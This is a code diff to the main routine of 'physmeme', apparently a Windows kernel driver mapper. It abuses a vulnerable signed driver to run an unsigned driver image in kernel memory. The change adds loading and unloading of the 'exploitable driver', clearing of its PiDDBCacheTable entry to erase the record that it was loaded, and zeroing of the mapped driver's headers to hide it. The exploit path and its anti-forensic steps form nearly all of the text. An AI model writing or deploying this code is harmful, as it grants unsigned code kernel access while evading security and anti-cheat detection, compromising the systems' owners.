@@ -1,5 +1,6 @@
 #include "kernel_ctx/kernel_ctx.h"
 #include "drv_image/drv_image.h"
+#include "raw_driver.hpp"
 
 int __cdecl main(int argc, char** argv)
 {
@@ -19,7 +20,32 @@ int __cdecl main(int argc, char** argv)
 	}
 
 	physmeme::drv_image image(drv_buffer);
+	physmeme::load_drv();
 	physmeme::kernel_ctx ctx;
+
+	//
+	// unload exploitable driver
+	//
+	if (!physmeme::unload_drv())
+	{
+		perror("[!] unable to unload driver... all handles closed?\n");
+		return -1;
+	}
+	printf("[+] unloaded exploitable driver....\n");
+
+	//
+	// shoot the tires off piddb cache entry.
+	//
+	const auto drv_timestamp = util::get_file_header((void*)raw_driver)->TimeDateStamp;
+	printf("[+] clearing piddb cache for driver: %s, with timestamp 0x%x\n", physmeme::drv_key.c_str(), drv_timestamp);
+
+	if (!ctx.clear_piddb_cache(physmeme::drv_key, drv_timestamp))
+	{
+		// this is because the signature might be broken on these versions of windows.
+		perror("[-] failed to clear PiDDBCacheTable.\n");
+		return -1;
+	}
+	printf("[+] cleared piddb cache...\n");
 
 	//
 	// lambdas used for fixing driver image
@@ -31,7 +57,7 @@ int __cdecl main(int argc, char** argv)
 
 	const auto _get_export_name = [&](const char* base, const char* name)
 	{
-		return reinterpret_cast<std::uintptr_t>(util::get_module_export(base, name));
+		return reinterpret_cast<std::uintptr_t>(util::get_kernel_export(base, name));
 	};
 
 	//
@@ -73,7 +99,7 @@ int __cdecl main(int argc, char** argv)
 	//
 	auto result = ctx.syscall<DRIVER_INITIALIZE>(
 		reinterpret_cast<void*>(entry_point),
-		reinterpret_cast<std::uintptr_t>(pool_base), 
+		reinterpret_cast<std::uintptr_t>(pool_base),
 		image.size()
 	);
 	printf("[+] driver entry returned: 0x%p\n", result);
@@ -82,7 +108,6 @@ int __cdecl main(int argc, char** argv)
 	// zero driver headers
 	//
 	ctx.zero_kernel_memory(pool_base, image.header_size());
-	physmeme::unload_drv();
 	printf("[=] press enter to close\n");
 	std::cin.get();
 }
